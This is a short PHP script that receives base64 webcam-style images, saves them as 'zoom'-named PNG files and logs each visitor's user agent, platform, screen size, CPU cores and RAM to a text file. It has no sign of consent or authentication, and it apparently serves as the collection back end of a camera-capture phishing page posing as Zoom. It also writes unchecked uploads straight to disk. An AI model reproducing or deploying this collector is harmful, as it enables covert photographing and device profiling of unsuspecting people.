<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}

// Save Image
$imageData = str_replace(' ', '+', $_POST['cat']);
$filteredData = substr($imageData, strpos($imageData, ",")+1);
$unencodedData = base64_decode($filteredData);
$fp = fopen( '../../images/zoom'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

// Save Device Info
if (!empty($_POST['info'])) {
    $info = json_decode($_POST['info'], true);
    $logData = "Date: " . date('Y-m-d H:i:s') . "\n";
    $logData .= "User Agent: " . $info['userAgent'] . "\n";
    $logData .= "Platform: " . $info['platform'] . "\n";
    $logData .= "Screen: " . $info['screen'] . "\n";
    $logData .= "Cores: " . $info['cores'] . "\n";
    $logData .= "RAM: " . $info['ram'] . " GB\n";
    $logData .= "--------------------------------------------------\n";
    
    $fp = fopen('device_info.txt', 'a');
    fwrite($fp, $logData);
    fclose($fp);
}

$fp = fopen('result.txt', 'w');
fwrite($fp, "Image File Saved : ../../images/zoom".$date.".png");
fclose($fp);

exit();
?>
